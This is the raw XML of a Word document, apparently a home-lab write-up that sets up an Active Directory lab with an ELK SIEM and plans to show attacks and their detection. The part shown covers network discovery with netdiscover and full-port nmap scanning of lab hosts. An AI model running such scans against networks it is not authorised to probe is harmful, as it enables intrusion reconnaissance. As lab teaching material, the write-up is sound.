        <w:t xml:space="preserve"> user of active directory.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F1311E" w:rsidRDefault="00F1311E" w:rsidP="00EC249B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F1311E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Windows 10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 10.10.0.6</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F1311E" w:rsidRDefault="00F1311E" w:rsidP="00F1311E">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Name – Frank Castle</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F1311E" w:rsidRPr="00CB5870" w:rsidRDefault="00F1311E" w:rsidP="00F1311E">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Name :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fcastle@laderlapen.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00F1311E" w:rsidRDefault="00F1311E" w:rsidP="00F1311E">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The second user of active directory.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F1311E" w:rsidRDefault="00F1311E" w:rsidP="00F1311E">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Internal </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Netowrk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Servers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F1311E" w:rsidRDefault="00F1311E" w:rsidP="00F1311E">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F1311E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Windows Server 2019</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 10.10.1.100</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F1311E" w:rsidRDefault="00F1311E" w:rsidP="00F1311E">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Active Directory installed and configured.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC249B" w:rsidRDefault="00F1311E" w:rsidP="00F1311E">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F1311E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>ELK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 10.10.1.6</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F1311E" w:rsidRDefault="00F1311E" w:rsidP="00133666">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">ELK will be </w:t>
      </w:r>
      <w:r w:rsidR="00133666">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">our </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>SIEM</w:t>
      </w:r>
      <w:r w:rsidR="00133666">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the place where we see all the logs that coming for all systems </w:t>
      </w:r>
      <w:r w:rsidR="00133666">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>n our network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001B455C" w:rsidRPr="001B1649" w:rsidRDefault="001B455C" w:rsidP="006D549E">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CB5870" w:rsidRPr="00CB5870" w:rsidRDefault="00CB5870" w:rsidP="00CB5870">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Explanation About the Document:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB5870" w:rsidRPr="00CB5870" w:rsidRDefault="00CB5870" w:rsidP="00CB5870">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">In this document I will show how attacker can grab information and find </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and hosts on the same network, find vulnerabilities </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>and use them to gain shell access and privilege escalation on all the machines.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A324C4" w:rsidRDefault="00CB5870" w:rsidP="00F1311E">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>On the defend side we will see how we can catch a lot of attacks on the network with</w:t>
      </w:r>
      <w:r w:rsidR="00F1311E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> snort and </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">logs </w:t>
      </w:r>
      <w:r w:rsidR="00F1311E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>that coming from the systems</w:t>
      </w:r>
      <w:r w:rsidR="008B0A1E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>, on the users machines we installed b</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">eats like: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>auditbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which installed on Ubuntu and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>winlogbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sysmon</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which installed on windows 10 users and on windows server 19. This document will show first the attack and how that’s works and then show the </w:t>
      </w:r>
      <w:r w:rsidR="00F1311E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>defense</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> side that </w:t>
      </w:r>
      <w:r w:rsidR="00F1311E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">monitoring </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">attacks with logs on the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Kibana</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> So let’s start </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F04A"/>
      </w:r>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816271" w:rsidRDefault="00816271" w:rsidP="00CB5870">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004E5063" w:rsidRDefault="004E5063" w:rsidP="00944C35">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004E5063" w:rsidRDefault="004E5063" w:rsidP="00944C35">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00816271" w:rsidRPr="00944C35" w:rsidRDefault="00CE4C10" w:rsidP="00944C35">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Network Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816271" w:rsidRDefault="00816271" w:rsidP="00CB5870">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRDefault="00816271" w:rsidP="00CB5870">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="75BEBDE0">
            <wp:extent cx="5487035"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7035" cy="2956560"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRPr="001B1649" w:rsidRDefault="004E5063" w:rsidP="00536E41">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">bove we first need </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>find</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the</w:t>
      </w:r>
      <w:r w:rsidR="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> address of the target</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>s we can see from</w:t>
      </w:r>
      <w:r w:rsidR="00E1307F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidR="00E1307F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">put we find few </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E1307F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E1307F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> address</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r w:rsidR="00E1307F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> we looking for 10.0.0.4 which will be the firewall and router for our </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lab</w:t>
      </w:r>
      <w:r w:rsidR="00E1307F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRPr="001B1649" w:rsidRDefault="00CE4C10" w:rsidP="00CE4C10">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: used: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>netdiscover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –r /10.0.0.0/24.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRPr="001B1649" w:rsidRDefault="00CE4C10" w:rsidP="00CE4C10">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Netdiscover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> tool on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> systems find hosts on the same network</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRDefault="00CE4C10" w:rsidP="00CE4C10">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B0D3723" wp14:editId="1CB897F0">
            <wp:extent cx="5486400" cy="2392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392680"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRPr="001B1649" w:rsidRDefault="00CE4C10" w:rsidP="00CE4C10">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p- -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.0.0.4 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>oA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Lab</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRPr="001B1649" w:rsidRDefault="00CE4C10" w:rsidP="00CE4C10">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>-p-  scan all ports</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRPr="001B1649" w:rsidRDefault="00CE4C10" w:rsidP="00CE4C10">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> run default script</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRPr="001B1649" w:rsidRDefault="00CE4C10" w:rsidP="00CE4C10">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> enumerate versions of the services</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRPr="001B1649" w:rsidRDefault="00CE4C10" w:rsidP="00CE4C10">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
